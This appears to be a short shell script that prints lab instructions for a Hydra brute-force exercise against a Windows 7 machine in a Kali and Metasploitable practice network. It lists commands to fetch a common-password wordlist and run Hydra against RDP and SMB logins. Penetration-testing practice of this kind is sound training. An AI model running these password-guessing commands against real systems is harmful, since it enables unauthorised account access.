echo '
--] BRUTE FORCE HYDRA 30

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133




OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> wget -O pass.lst https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt 
OPERATOR    ==> TASK ==> echo "Aa123456" >> pass.lst
OPERATOR    ==> TASK ==> hydra -l ptbox -P pass.lst IP_TANGO rdp -V -f -t 2
OPERATOR    ==> TASK ==> hydra -l ptbox -P pass.lst IP_TANGO smb -V -f -t 2
OPERATOR    ==> TASK ==> hydra -L username.lst -p pass.lst IP_TANGO smb -V -f -t 2
'
read